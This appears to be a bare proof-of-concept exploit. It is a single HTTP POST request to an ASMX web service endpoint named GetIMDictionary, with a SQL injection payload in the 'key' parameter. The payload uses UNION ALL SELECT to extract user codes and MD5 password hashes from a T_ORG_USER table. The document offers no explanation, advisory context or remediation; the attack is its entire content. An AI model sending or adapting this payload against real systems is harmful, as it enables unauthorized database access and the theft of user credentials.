POC: 

```
POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1 
Host: 
Content-Type: application/x-www-form-urlencoded

key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```

